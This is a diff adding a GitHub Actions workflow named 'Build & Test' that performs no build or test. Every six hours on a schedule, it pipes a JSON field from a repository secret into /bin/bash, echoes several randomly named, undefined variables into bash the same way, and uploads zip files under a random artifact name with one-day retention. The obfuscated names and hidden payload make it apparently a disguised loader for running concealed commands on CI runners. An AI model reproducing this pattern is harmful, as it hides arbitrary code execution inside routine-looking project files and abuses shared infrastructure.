@@ -1,0 +1,37 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Execute
+        env:
+          gv181: ${{ secrets.gv181 }}
+        run: |
+          printf '%s' "$gv181" | jq -r .bdqii88 | /bin/bash
+          echo $kowzo32372 | jq -r .p5417 | /bin/bash
+          echo $cvy4 | jq -r .monn65372 | /bin/bash
+          echo $t0621 | jq -r .cnsfy299 | /bin/bash
+          echo $zz56871 | jq -r .mymus80174 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: czYkpYLe
+          path: "*.zip"
+          retention-days: 1
